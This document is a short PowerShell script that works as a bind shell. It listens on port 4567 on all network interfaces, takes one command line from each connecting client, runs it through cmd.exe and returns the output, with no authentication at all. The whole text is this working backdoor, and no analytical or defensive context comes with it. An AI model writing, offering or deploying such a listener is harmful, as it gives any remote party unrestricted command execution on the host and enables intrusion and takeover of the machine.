# ── Configuration ─────────────────────────────────────────────
$remoteIP = "0.0.0.0"    # Listen on all interfaces
$port     = 4567          # Listening port

# ── Start TCP Listener ────────────────────────────────────────
$listener = [System.Net.Sockets.TcpListener]::new(
    [System.Net.IPAddress]::Parse($remoteIP),
    $port
)
$listener.Start()
Write-Host "Listening on..."

try {
    while ($true) {

        # ── Accept connection ──────────────────────────────────────
        $client = $listener.AcceptTcpClient()
        Write-Host "Client connected."

        # ── Set up I/O streams ─────────────────────────────────────
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # ── Read inbound command ───────────────────────────────────
        $command = $reader.ReadLine()
        Write-Host "Received command: $command"

        # ── Execute command via CMD ────────────────────────────────
        try {
            $process = Start-Process cmd.exe `
                -ArgumentList "/c $command" `
                -NoNewWindow `
                -RedirectStandardOutput "output.txt" `
                -PassThru

            $process.WaitForExit()
            $output = Get-Content "output.txt" | Out-String
            Remove-Item "output.txt"
        }
        catch {
            $output = "Error executing command: $_"
        }

        # ── Send response and close ────────────────────────────────
        $writer.WriteLine($output)
        $client.Close()
        Write-Host "Client disconnected."
    }
}
catch {
    Write-Host "An error occurred: $_"
}
finally {
    $listener.Stop()
    Write-Host "Server stopped."
}